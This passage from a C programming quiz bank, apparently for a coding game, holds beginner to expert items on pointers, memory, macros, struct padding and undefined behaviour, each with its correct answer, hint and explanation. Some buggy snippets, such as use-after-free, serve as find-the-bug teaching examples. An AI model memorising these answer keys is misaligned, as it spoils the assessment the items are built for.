    explanation: "`<stdio.h>` declares the standard input/output functions including `printf`, `scanf`, `puts`, and `fopen`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["preprocessor", "headers"]
  },
  {
    id: "c-beg-014",
    language: "c",
    difficulty: "beginner",
    type: "fill_code",
    topic: "syntax",
    subtopic: "exit_status",
    standardVersion: "C99",
    prompt: "Complete the return statement for standard successful program termination:",
    code: "#include <stdio.h>\nint main(void) {\n    ___BLANK_1___ 0;\n}",
    blankCount: 1,
    options: ["return", "exit", "break", "pass"],
    correctAnswer: "return",
    acceptedAnswers: ["return"],
    hint: "Functions return values using the `return` keyword.",
    explanation: "`return 0;` inside `main()` signals successful termination with exit status 0 to the operating system.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["syntax", "functions"]
  },
  {
    id: "c-beg-015",
    language: "c",
    difficulty: "beginner",
    type: "code_tracing",
    topic: "algorithms",
    subtopic: "variable_swap",
    standardVersion: "C99",
    prompt: "Trace the values of `x` and `y` after this temporary variable swap:",
    code: "#include <stdio.h>\nint main(void) {\n    int x = 10, y = 20, temp;\n    temp = x;\n    x = y;\n    y = temp;\n    printf(\"%d %d\", x, y);\n    return 0;\n}",
    options: ["20 10", "10 20", "20 20", "10 10"],
    correctAnswer: "20 10",
    acceptedAnswers: ["20 10"],
    hint: "temp captures original x (10), x takes y (20), and y receives temp (10).",
    explanation: "Classic 3-step swap: `temp = 10`, `x = 20`, `y = 10`. Printing `x` followed by `y` outputs '20 10'.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["tracing", "algorithms"]
  },
  {
    id: "c-beg-016",
    language: "c",
    difficulty: "beginner",
    type: "predict_output",
    topic: "operators",
    subtopic: "integer_truncation",
    standardVersion: "C99",
    prompt: "In C99, how does integer division `7 / 2` evaluate?",
    code: "#include <stdio.h>\nint main(void) {\n    int res = 7 / 2;\n    printf(\"%d\", res);\n    return 0;\n}",
    options: ["3", "3.5", "4", "0"],
    correctAnswer: "3",
    acceptedAnswers: ["3", 3],
    hint: "Division between two integer operands in C performs integer truncation toward zero.",
    explanation: "Under §6.5.5 of C99, the result of the `/` operator between two integer operands is the algebraic quotient with any fractional part discarded (truncated toward zero). `7 / 2 = 3`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["operators", "math"]
  },
  {
    id: "c-beg-017",
    language: "c",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "types",
    subtopic: "const_qualifier",
    standardVersion: "C99",
    prompt: "What occurs when attempting to compile: `const int MAX = 100; MAX = 200;`?",
    code: "const int MAX = 100;\nMAX = 200;",
    options: [
      "Compilation error (assignment of read-only variable)",
      "Runtime segmentation fault",
      "MAX silently updates to 200",
      "Undefined behavior at runtime"
    ],
    correctAnswer: "Compilation error (assignment of read-only variable)",
    acceptedAnswers: ["Compilation error (assignment of read-only variable)"],
    hint: "The const keyword qualifies a variable as read-only at compile time.",
    explanation: "The `const` type qualifier instructs the compiler that the identifier is not modifiable. Attempting to assign to a const-qualified lvalue triggers a compile-time error.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["const", "types"]
  },
  {
    id: "c-beg-018",
    language: "c",
    difficulty: "beginner",
    type: "predict_output",
    topic: "control_flow",
    subtopic: "do_while",
    standardVersion: "C99",
    prompt: "How many times does the body of a `do-while` loop execute when the condition is initially false?",
    code: "#include <stdio.h>\nint main(void) {\n    int count = 0;\n    do {\n        count++;\n    } while(0);\n    printf(\"%d\", count);\n    return 0;\n}",
    options: ["1", "0", "Infinite loop", "Compilation error"],
    correctAnswer: "1",
    acceptedAnswers: ["1", 1],
    hint: "A do-while loop tests its condition at the bottom, after the body has executed.",
    explanation: "In a `do-while` loop, the body always executes at least once before the condition at the end (`while(0)`) is tested.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["loops", "control_flow"]
  },
  {
    id: "c-beg-019",
    language: "c",
    difficulty: "beginner",
    type: "predict_output",
    topic: "scoping",
    subtopic: "block_scope",
    standardVersion: "C99",
    prompt: "What is printed when an inner block declares a variable that shadows an outer variable?",
    code: "#include <stdio.h>\nint main(void) {\n    int x = 10;\n    {\n        int x = 20;\n    }\n    printf(\"%d\", x);\n    return 0;\n}",
    options: ["10", "20", "30", "Compilation error"],
    correctAnswer: "10",
    acceptedAnswers: ["10", 10],
    hint: "The inner x exists only within the nested curly braces {}. The outer x is unaffected.",
    explanation: "Variables declared within a compound block `{}` have block scope. The inner `x = 20` shadows the outer `x` temporarily and is destroyed upon leaving the block. The outer `x` remains 10.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["scoping", "blocks"]
  },
  {
    id: "c-beg-020",
    language: "c",
    difficulty: "beginner",
    type: "predict_output",
    topic: "types",
    subtopic: "cast_truncation",
    standardVersion: "C99",
    prompt: "What is the result of casting a floating-point number to an integer in C?",
    code: "#include <stdio.h>\nint main(void) {\n    double val = 9.87;\n    int res = (int)val;\n    printf(\"%d\", res);\n    return 0;\n}",
    options: ["9", "10", "9.87", "Undefined"],
    correctAnswer: "9",
    acceptedAnswers: ["9", 9],
    hint: "Floating to integer conversion in C truncates the fractional part without rounding.",
    explanation: "Converting a float or double to an integer in C discards the decimal fraction entirely (truncation toward zero), converting `9.87` to `9`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["types", "casting"]
  },

  // =========================================================================
  // C INTERMEDIATE (20 QUESTIONS: c-int-001 to c-int-020)
  // =========================================================================
  {
    id: "c-int-001",
    language: "c",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "pointers",
    subtopic: "pointer_arithmetic",
    standardVersion: "C99",
    prompt: "Assuming a 64-bit architecture where `sizeof(int) == 4`, what does `ptr + 3` evaluate to relative to the address of `arr`?",
    code: "int arr[5] = {10, 20, 30, 40, 50};\nint *ptr = arr;",
    options: [
      "Address of arr plus 12 bytes",
      "Address of arr plus 3 bytes",
      "Address of arr plus 24 bytes",
      "Value 40 dereferenced"
    ],
    correctAnswer: "Address of arr plus 12 bytes",
    acceptedAnswers: ["Address of arr plus 12 bytes"],
    hint: "Pointer arithmetic in C automatically scales by the size of the referenced type.",
    explanation: "In C, adding integer `k` to a pointer of type `T*` advances the memory address by `k * sizeof(T)` bytes. Here, `3 * sizeof(int) = 3 * 4 = 12` bytes, pointing directly to `arr[3]`.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["pointers", "memory"]
  },
  {
    id: "c-int-002",
    language: "c",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "arrays",
    subtopic: "array_decay",
    standardVersion: "C99",
    prompt: "What does `sizeof(arr)` evaluate to inside a function where an array parameter has decayed into a pointer on a 64-bit system?",
    code: "#include <stdio.h>\nvoid inspect(int arr[10]) {\n    printf(\"%zu\", sizeof(arr));\n}\nint main(void) {\n    int data[10];\n    inspect(data);\n    return 0;\n}",
    options: ["8", "40", "10", "4"],
    correctAnswer: "8",
    acceptedAnswers: ["8", 8],
    hint: "Array parameters in function signatures decay into pointers: int arr[10] becomes int *arr.",
    explanation: "In C function parameter lists, `int arr[10]` decays into `int *arr`. Calling `sizeof(arr)` inside the function computes the size of a pointer (`sizeof(int*)`), which is 8 bytes on a 64-bit architecture.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["arrays", "pointers", "sizeof"]
  },
  {
    id: "c-int-003",
    language: "c",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "strings",
    subtopic: "strcmp_semantics",
    standardVersion: "C99",
    prompt: "What sign does `strcmp(\"apple\", \"banana\")` return in C?",
    code: "#include <stdio.h>\n#include <string.h>\nint main(void) {\n    int res = strcmp(\"apple\", \"banana\");\n    printf(\"%s\", res < 0 ? \"NEGATIVE\" : (res > 0 ? \"POSITIVE\" : \"ZERO\"));\n    return 0;\n}",
    options: ["NEGATIVE", "POSITIVE", "ZERO", "Undefined"],
    correctAnswer: "NEGATIVE",
    acceptedAnswers: ["NEGATIVE"],
    hint: "strcmp compares ASCII codes lexicographically. 'a' (97) < 'b' (98).",
    explanation: "`strcmp` compares character by character. At the first character, 'a' has a lower ASCII value than 'b', returning a negative integer.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["strings", "strcmp"]
  },
  {
    id: "c-int-004",
    language: "c",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "structs",
    subtopic: "dot_vs_arrow",
    standardVersion: "C99",
    prompt: "What is the equivalent dot-operator expression for `ptr->age` where `ptr` is a pointer to a struct?",
    code: "struct Person *ptr;",
    options: ["(*ptr).age", "*ptr.age", "&ptr->age", "*(ptr.age)"],
    correctAnswer: "(*ptr).age",
    acceptedAnswers: ["(*ptr).age"],
    hint: "The arrow operator -> dereferences the pointer and accesses the member in one step.",
    explanation: "Because the dot operator `.` has higher precedence than the dereference operator `*`, parentheses are required: `(*ptr).age` first dereferences `ptr` to the struct instance, then accesses the `age` field.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["structs", "syntax"]
  },
  {
    id: "c-int-005",
    language: "c",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "operators",
    subtopic: "bitwise_masking",
    standardVersion: "C99",
    prompt: "What is the result of checking if the 3rd bit (0-indexed, value 8) is set in integer 14 (`0000 1110`)?",
    code: "#include <stdio.h>\nint main(void) {\n    int flags = 14;\n    int has_bit = (flags & (1 << 3)) != 0;\n    printf(\"%d\", has_bit);\n    return 0;\n}",
    options: ["1", "0", "8", "14"],
    correctAnswer: "1",
    acceptedAnswers: ["1", 1],
    hint: "1 << 3 is 8 (binary 1000). 14 is binary 1110. 1110 & 1000 is 1000 (8 != 0).",
    explanation: "`1 << 3` evaluates to 8. `14 & 8` equals 8, which is non-zero, making `(flags & (1 << 3)) != 0` evaluate to 1 (true).",
    points: 200,
    estimatedSeconds: 45,
    tags: ["bitwise", "operators"]
  },
  {
    id: "c-int-006",
    language: "c",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "preprocessor",
    subtopic: "macro_parentheses",
    standardVersion: "C99",
    prompt: "What is the output of `SQUARE(2 + 3)` when the macro lacks enclosing parentheses?",
    code: "#include <stdio.h>\n#define SQUARE(x) x * x\nint main(void) {\n    printf(\"%d\", SQUARE(2 + 3));\n    return 0;\n}",
    options: ["11", "25", "10", "13"],
    correctAnswer: "11",
    acceptedAnswers: ["11", 11],
    hint: "The preprocessor performs textual substitution: 2 + 3 * 2 + 3.",
    explanation: "The macro expands textually to `2 + 3 * 2 + 3`. Multiplication has higher precedence than addition: `2 + (3 * 2) + 3 = 2 + 6 + 3 = 11`. Enclosing in parentheses `((x) * (x))` is required for 25.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["preprocessor", "macros"]
  },
  {
    id: "c-int-007",
    language: "c",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "strings",
    subtopic: "string_literal_rodata",
    standardVersion: "C99",
    prompt: "Why does `char *s = \"hello\"; s[0] = 'H';` cause a runtime crash (bus error or segmentation fault)?",
    code: "char *s = \"hello\";\ns[0] = 'H';",
    options: [
      "String literals are stored in read-only memory; modifying them is undefined behavior",
      "s is a null pointer",
      "C does not allow uppercase characters in strings",
      "strlen(s) is exceeded"
    ],
    correctAnswer: "String literals are stored in read-only memory; modifying them is undefined behavior",
    acceptedAnswers: ["String literals are stored in read-only memory; modifying them is undefined behavior"],
    hint: "In C, string literals reside in read-only data segments. Use `char s[] = \"hello\";` for mutable arrays.",
    explanation: "Under §6.4.5 of C99, attempting to modify a string literal results in undefined behavior. Operating systems typically place literal string constants into read-only memory segments (`.rodata`), triggering memory protection faults on write attempts.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["strings", "memory"]
  },
  {
    id: "c-int-008",
    language: "c",
    difficulty: "intermediate",
    type: "find_bug",
    topic: "memory",
    subtopic: "dangling_stack_pointer",
    standardVersion: "C99",
    prompt: "Identify the line containing a critical defect that returns the address of a local stack variable:",
    code: "#include <stdio.h>\nint* get_number(void) {\n    int val = 42;\n    return &val;\n}\nint main(void) {\n    int *p = get_number();\n    return 0;\n}",
    targetLine: 4,
    correctAnswer: 4,
    acceptedAnswers: [4, "4"],
    hint: "Local variables on the stack are destroyed as soon as the function returns.",
    explanation: "Line 4 executes `return &val;`. The lifetime of `val` ends when `get_number()` returns, leaving `p` as a dangling pointer pointing to an invalidated stack frame.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["debugging", "memory", "stack"]
  },
  {
    id: "c-int-009",
    language: "c",
    difficulty: "intermediate",
    type: "find_bug",
    topic: "memory",
    subtopic: "use_after_free",
    standardVersion: "C99",
    prompt: "Identify the line with a use-after-free defect that dereferences already-freed memory:",
    code: "#include <stdlib.h>\nint main(void) {\n    int *ptr = (int*)malloc(sizeof(int));\n    *ptr = 10;\n    free(ptr);\n    *ptr = 20;\n    return 0;\n}",
    targetLine: 6,
    correctAnswer: 6,
    acceptedAnswers: [6, "6"],
    hint: "Once free(ptr) is called, accessing *ptr is undefined behavior.",
    explanation: "Line 5 deallocates the heap block with `free(ptr)`. Line 6 dereferences and writes to `*ptr = 20`, causing undefined behavior (use-after-free).",
    points: 200,
    estimatedSeconds: 45,
    tags: ["debugging", "memory", "heap"]
  },
  {
    id: "c-int-010",
    language: "c",
    difficulty: "intermediate",
    type: "fill_code",
    topic: "memory",
    subtopic: "malloc_syntax",
    standardVersion: "C99",
    prompt: "Fill in the operator used to dynamically allocate memory for 10 integers:",
    code: "#include <stdlib.h>\nint main(void) {\n    int *arr = ___BLANK_1___(10 * sizeof(int));\n    free(arr);\n    return 0;\n}",
    blankCount: 1,
    options: ["malloc", "alloc", "new", "calloc"],
    correctAnswer: "malloc",
    acceptedAnswers: ["malloc"],
    hint: "Standard C heap allocation function from <stdlib.h> taking byte size.",
    explanation: "`malloc(size)` allocates the requested number of uninitialized bytes on the heap and returns a pointer to the allocated memory block.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["memory", "malloc"]
  },
  {
    id: "c-int-011",
    language: "c",
    difficulty: "intermediate",
    type: "fill_code",
    topic: "memory",
    subtopic: "null_guard",
    standardVersion: "C99",
    prompt: "Fill in the pointer literal used to check if dynamic memory allocation failed:",
    code: "#include <stdlib.h>\nint main(void) {\n    int *p = malloc(1000);\n    if (p == ___BLANK_1___) return 1;\n    free(p);\n    return 0;\n}",
    blankCount: 1,
    options: ["NULL", "nil", "nullptr", "0L"],
    correctAnswer: "NULL",
    acceptedAnswers: ["NULL"],
    hint: "The standard macro defined in <stdlib.h> representing a null pointer constant.",
    explanation: "In C, `NULL` is a standard macro representing a null pointer constant (`(void*)0` or `0`). When `malloc` fails to allocate memory, it returns `NULL`.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["pointers", "null"]
  },
  {
    id: "c-int-012",
    language: "c",
    difficulty: "intermediate",
    type: "code_tracing",
    topic: "pointers",
    subtopic: "pointer_walk",
    standardVersion: "C99",
    prompt: "Trace the execution of this pointer loop counting character occurrences:",
    code: "#include <stdio.h>\nint main(void) {\n    char str[] = \"banana\";\n    char *p = str;\n    int count = 0;\n    while (*p) {\n        if (*p == 'a') count++;\n        p++;\n    }\n    printf(\"%d\", count);\n    return 0;\n}",
    options: ["3", "2", "6", "1"],
    correctAnswer: "3",
    acceptedAnswers: ["3", 3],
    hint: "The word 'banana' contains the letter 'a' at indices 1, 3, and 5.",
    explanation: "Pointer `p` increments through each character of \"banana\" until hitting `\\0` (0). It increments `count` on each 'a', yielding exactly 3.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["pointers", "tracing"]
  },
  {
    id: "c-int-013",
    language: "c",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "storage_classes",
    subtopic: "static_local",
    standardVersion: "C99",
    prompt: "What is printed across two successive calls to a function containing a static local variable?",
    code: "#include <stdio.h>\nint step(void) {\n    static int n = 0;\n    n += 5;\n    return n;\n}\nint main(void) {\n    step();\n    printf(\"%d\", step());\n    return 0;\n}",
    options: ["10", "5", "0", "15"],
    correctAnswer: "10",
    acceptedAnswers: ["10", 10],
    hint: "Static local variables preserve their values in memory between function invocations.",
    explanation: "`static int n = 0` is initialized only once. The first call to `step()` increases `n` to 5. The second call increments it further to 10.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["storage_classes", "static"]
  },
  {
    id: "c-int-014",
    language: "c",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "arrays",
    subtopic: "row_major_order",
    standardVersion: "C99",
    prompt: "What is printed when accessing a 2D array treated as flat contiguous memory?",
    code: "#include <stdio.h>\nint main(void) {\n    int grid[2][3] = {{1, 2, 3}, {4, 5, 6}};\n    int *p = (int*)grid;\n    printf(\"%d\", *(p + 4));\n    return 0;\n}",
    options: ["5", "4", "3", "6"],
    correctAnswer: "5",
    acceptedAnswers: ["5", 5],
    hint: "2D arrays in C are stored in row-major order: {1, 2, 3, 4, 5, 6}.",
    explanation: "In row-major contiguous memory, `grid[0][0]=1`, `grid[0][1]=2`, `grid[0][2]=3`, `grid[1][0]=4`, `grid[1][1]=5`. Offset `*(p + 4)` accesses index 4, which is 5.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["arrays", "memory"]
  },
  {
    id: "c-int-015",
    language: "c",
    difficulty: "intermediate",
    type: "multiple_choice",
    topic: "functions",
    subtopic: "function_pointers",
    standardVersion: "C99",
    prompt: "What is the correct syntax for declaring a function pointer named `fp` that accepts two `int` parameters and returns `int`?",
    code: "int add(int a, int b);",
    options: [
      "int (*fp)(int, int);",
      "int *fp(int, int);",
      "int fp*(int, int);",
      "(*fp)(int, int) -> int;"
    ],
    correctAnswer: "int (*fp)(int, int);",
    acceptedAnswers: ["int (*fp)(int, int);"],
    hint: "Parentheses around `(*fp)` bind the pointer to the identifier, rather than creating a function returning a pointer.",
    explanation: "`int (*fp)(int, int)` declares a pointer `fp` to a function taking two integers and returning an integer. Without parentheses, `int *fp(int, int)` would declare a function returning `int*`.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["function_pointers", "syntax"]
  },
  {
    id: "c-int-016",
    language: "c",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "unions",
    subtopic: "shared_memory",
    standardVersion: "C99",
    prompt: "What is the size of a `union` containing an `int` (4 bytes) and a `double` (8 bytes)?",
    code: "#include <stdio.h>\nunion Data {\n    int i;\n    double d;\n};\nint main(void) {\n    printf(\"%zu\", sizeof(union Data));\n    return 0;\n}",
    options: ["8", "12", "4", "16"],
    correctAnswer: "8",
    acceptedAnswers: ["8", 8],
    hint: "A union allocates memory sufficient to hold only its largest member.",
    explanation: "Unlike structs which accumulate the sum of member sizes plus padding, a union overlaps its members in the same memory location, taking the size of its largest member: `sizeof(double) == 8`.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["unions", "sizeof"]
  },
  {
    id: "c-int-017",
    language: "c",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "pointers",
    subtopic: "const_pointers",
    standardVersion: "C99",
    prompt: "In `const int *ptr = &val;`, what does the `const` qualify?",
    code: "int val = 10;\nconst int *ptr = &val;",
    options: [
      "The integer pointed to is read-only (*ptr cannot be mutated)",
      "The pointer address itself cannot be changed (ptr is fixed)",
      "Both the pointer address and the integer value are fixed",
      "val becomes an integer literal"
    ],
    correctAnswer: "The integer pointed to is read-only (*ptr cannot be mutated)",
    acceptedAnswers: ["The integer pointed to is read-only (*ptr cannot be mutated)"],
    hint: "Read from right to left: `const int *` is a pointer to a constant integer.",
    explanation: "`const int *ptr` means `ptr` is a pointer to a constant integer. The address stored in `ptr` can be updated (`ptr = &other;`), but modifying the value via `*ptr = 20;` is disallowed.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["const", "pointers"]
  },
  {
    id: "c-int-018",
    language: "c",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "preprocessor",
    subtopic: "stringification",
    standardVersion: "C99",
    prompt: "What does the preprocessor `#` stringification operator do inside a macro definition?",
    code: "#include <stdio.h>\n#define STR(x) #x\nint main(void) {\n    printf(\"%s\", STR(SyntaxArena));\n    return 0;\n}",
    options: ["SyntaxArena", "\"SyntaxArena\"", "STR(SyntaxArena)", "Compilation error"],
    correctAnswer: "SyntaxArena",
    acceptedAnswers: ["SyntaxArena"],
    hint: "The # operator converts macro parameters into string literal tokens.",
    explanation: "In C preprocessor macros, `#x` transforms the argument `x` into a string literal `\"SyntaxArena\"`. `printf(\"%s\", ...)` outputs 'SyntaxArena'.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["preprocessor", "macros"]
  },
  {
    id: "c-int-019",
    language: "c",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "memory",
    subtopic: "calloc_zeroed",
    standardVersion: "C99",
    prompt: "What is the key functional difference between `malloc` and `calloc`?",
    code: "int *p1 = malloc(5 * sizeof(int));\nint *p2 = calloc(5, sizeof(int));",
    options: [
      "calloc initializes all allocated bytes to zero; malloc leaves memory uninitialized",
      "malloc allocates on the stack; calloc allocates on the heap",
      "calloc cannot fail and never returns NULL",
      "malloc is limited to 1024 bytes"
    ],
    correctAnswer: "calloc initializes all allocated bytes to zero; malloc leaves memory uninitialized",
    acceptedAnswers: ["calloc initializes all allocated bytes to zero; malloc leaves memory uninitialized"],
    hint: "calloc stands for contiguous allocation with explicit zero-initialization.",
    explanation: "`calloc(num, size)` clears and sets every allocated byte to zero (`0x00`). `malloc(bytes)` leaves the heap block uninitialized, containing whatever garbage data was previously in memory.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["memory", "calloc"]
  },
  {
    id: "c-int-020",
    language: "c",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "enums",
    subtopic: "implicit_values",
    standardVersion: "C99",
    prompt: "What integer value is assigned to `BLUE` in this enumeration definition?",
    code: "#include <stdio.h>\nenum Color { RED = 5, GREEN, BLUE };\nint main(void) {\n    printf(\"%d\", BLUE);\n    return 0;\n}",
    options: ["7", "2", "6", "5"],
    correctAnswer: "7",
    acceptedAnswers: ["7", 7],
    hint: "In C enums, unspecified elements increment by 1 from the preceding member.",
    explanation: "Because `RED` is explicitly assigned 5, `GREEN` automatically increments to 6, and `BLUE` increments to 7.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["enums", "types"]
  },

  // =========================================================================
  // C EXPERT (20 QUESTIONS: c-exp-001 to c-exp-020)
  // =========================================================================
  {
    id: "c-exp-001",
    language: "c",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "memory_layout",
    subtopic: "struct_padding",
    standardVersion: "C99",
    prompt: "Assuming a 64-bit architecture where `sizeof(char) == 1`, `sizeof(int) == 4`, and `sizeof(double) == 8`, why does `sizeof(struct Mixed)` evaluate to 16 bytes rather than 13 bytes?",
    code: "struct Mixed {\n    char c;\n    int i;\n    double d;\n};",
    options: [
      "Structure padding adds alignment bytes so each member aligns to a multiple of its natural size",
      "Compilers round all struct sizes to the nearest power of two",
      "The struct header consumes 3 metadata bytes in C99",
      "Double precision floats require double memory space in structs"
    ],
    correctAnswer: "Structure padding adds alignment bytes so each member aligns to a multiple of its natural size",
    acceptedAnswers: ["Structure padding adds alignment bytes so each member aligns to a multiple of its natural size"],
    hint: "Memory alignment constraints require members to align on addresses divisible by their size.",
    explanation: "Under §6.7.2.1 of C99, compilers insert padding bytes for CPU memory alignment. `c` takes 1 byte + 3 bytes padding so that `int i` aligns on a 4-byte boundary. `i` takes 4 bytes. `double d` takes 8 bytes on an 8-byte boundary. Total: $1 + 3 + 4 + 8 = 16$ bytes.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["structs", "padding", "alignment"]
  },
  {
    id: "c-exp-002",
    language: "c",
    difficulty: "expert",
    type: "predict_output",
    topic: "types",
    subtopic: "integer_promotions",
    standardVersion: "C99",
    prompt: "What does `sizeof(~a)` evaluate to where `a` is an `unsigned char` on a system with 32-bit `int`?",
    code: "#include <stdio.h>\nint main(void) {\n    unsigned char a = 0x55;\n    printf(\"%zu\", sizeof(~a));\n    return 0;\n}",
    options: ["4", "1", "2", "8"],
    correctAnswer: "4",
    acceptedAnswers: ["4", 4],
    hint: "Unary operators trigger integer promotions, promoting types smaller than int to signed int.",
    explanation: "Under §6.5.3.3 and §6.3.1.1 of C99, integer promotion rules promote any integer type with rank less than `int` (such as `unsigned char`) to `int` before applying unary operator `~`. Thus, `~a` has type `int`, whose size is 4 bytes.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["promotions", "bitwise"]
  },
  {
    id: "c-exp-003",
    language: "c",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "standards",
    subtopic: "sequence_points_ub",
    standardVersion: "C99",
    prompt: "Why is the expression `i = i++` strictly undefined behavior in ISO C99?",
    code: "int i = 5;\ni = i++;",
    options: [
      "A scalar object has its stored value modified more than once between sequence points",
      "The post-increment operator cannot be combined with an assignment operator",
      "Variable i overflows its 32-bit register storage",
      "The compiler treats ++ as a syntax error on lvalues"
    ],
    correctAnswer: "A scalar object has its stored value modified more than once between sequence points",
    acceptedAnswers: ["A scalar object has its stored value modified more than once between sequence points"],
    hint: "C99 §6.5 paragraph 2 specifies the rules for modifying scalar objects between sequence points.",
    explanation: "Under C99 §6.5p2: 'Between the previous and next sequence point an object shall have its stored value modified at most once by the evaluation of an expression.' Since `i` is both modified by `++` and assigned to in the same expression without an intervening sequence point, behavior is strictly undefined.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["undefined_behavior", "standards"]
  },
  {
    id: "c-exp-004",
    language: "c",
    difficulty: "expert",
    type: "predict_output",
    topic: "pointers",
    subtopic: "double_pointers",
    standardVersion: "C99",
    prompt: "What is printed when modifying an outside pointer using a double pointer parameter?",
    code: "#include <stdio.h>\nvoid alloc_val(int **ptr, int val) {\n    static int target;\n    target = val;\n    *ptr = &target;\n}\nint main(void) {\n    int *p = NULL;\n    alloc_val(&p, 77);\n    printf(\"%d\", *p);\n    return 0;\n}",
    options: ["77", "0", "Segmentation fault", "NULL"],
    correctAnswer: "77",
    acceptedAnswers: ["77", 77],
    hint: "`*ptr = &target` updates the caller's pointer variable `p` to point to `target`.",
    explanation: "Passing `&p` into `alloc_val` passes a pointer to the pointer `p`. `*ptr = &target` modifies `p` itself to store the address of `target`. Since `target` is static, its lifetime extends for the entire program execution.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["pointers", "double_pointers"]
  },
  {
    id: "c-exp-005",
    language: "c",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "optimization",
    subtopic: "volatile_semantics",
    standardVersion: "C99",
    prompt: "What does the `volatile` type qualifier instruct the optimizing compiler to do?",
    code: "volatile int *status_reg = (int*)0x40001000;",
    options: [
      "Prevent optimizing away reads and writes to the object and enforce exact access ordering",
      "Place the variable into the CPU hardware register cache",
      "Lock the variable across multiple threads using an internal mutex",
      "Prevent other functions from modifying the variable"
    ],
    correctAnswer: "Prevent optimizing away reads and writes to the object and enforce exact access ordering",
    acceptedAnswers: ["Prevent optimizing away reads and writes to the object and enforce exact access ordering"],
    hint: "Volatile is used for memory-mapped hardware I/O and signal handlers where memory values change externally.",
    explanation: "Under §6.7.3 of C99, `volatile` informs the compiler that an object's value can be changed by hardware, signal handlers, or other threads outside the compiler's view. The compiler is forbidden from caching the value in registers or eliminating redundant reads/writes.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["volatile", "optimization"]
  },
  {
    id: "c-exp-006",
    language: "c",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "pointers",
    subtopic: "restrict_qualifier",
    standardVersion: "C99",
    prompt: "In C99, what guarantee does the `restrict` qualifier give to the compiler?",
    code: "void update(int * restrict a, int * restrict b);",
    options: [
      "The two pointers do not alias (point to overlapping memory regions)",
      "The memory addresses are read-only and cannot be written to",
      "The pointers cannot be assigned to NULL",
      "The function must be inlined by the compiler"
    ],
    correctAnswer: "The two pointers do not alias (point to overlapping memory regions)",
    acceptedAnswers: ["The two pointers do not alias (point to overlapping memory regions)"],
    hint: "Restrict enables aggressive compiler optimizations by asserting that pointers do not alias.",
    explanation: "`restrict` is an optimization hint introduced in C99. It promises the compiler that for the lifetime of the pointer, all accesses to the object it points to will be made through that pointer (or a pointer derived from it), guaranteeing no pointer aliasing.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["restrict", "pointers"]
  },
  {
    id: "c-exp-007",
    language: "c",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "standards",
    subtopic: "strict_aliasing",
    standardVersion: "C99",
    prompt: "What rule is violated when casting `int*` to `float*` and dereferencing: `int i = 5; float *f = (float*)&i; *f = 2.0f;`?",
    code: "int i = 5;\nfloat *f = (float*)&i;\n*f = 2.0f;",
    options: [
      "Strict aliasing rule (§6.5p7)",
      "Constant folding constraint",
      "Data type promotion rule",
      "Address sanitizer constraint"
    ],
    correctAnswer: "Strict aliasing rule (§6.5p7)",
    acceptedAnswers: ["Strict aliasing rule (§6.5p7)"],
    hint: "In C, accessing an object through an lvalue of an incompatible type is undefined behavior.",
    explanation: "C's Strict Aliasing rule (§6.5p7) states that pointers of distinct, incompatible types (such as `int*` and `float*`) cannot point to the same memory location, allowing compilers to reorder instructions assuming the two cannot alias.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["strict_aliasing", "standards"]
  },
  {
    id: "c-exp-008",
    language: "c",
    difficulty: "expert",
    type: "predict_output",
    topic: "structs",
    subtopic: "flexible_array_members",
    standardVersion: "C99",
    prompt: "What does `sizeof(struct Packet)` evaluate to when the struct ends with a C99 flexible array member `int data[]`?",
    code: "#include <stdio.h>\nstruct Packet {\n    int length;\n    int data[];\n};\nint main(void) {\n    printf(\"%zu\", sizeof(struct Packet));\n    return 0;\n}",
    options: ["4", "0", "8", "Compilation error"],
    correctAnswer: "4",
    acceptedAnswers: ["4", 4],
    hint: "A flexible array member in C99 contributes zero bytes to the struct's sizeof, except for possible trailing alignment padding.",
    explanation: "Under §6.7.2.1 of C99, the flexible array member `int data[]` is treated as if it were omitted when computing the structure's `sizeof`. Only `int length` (4 bytes) is counted.",
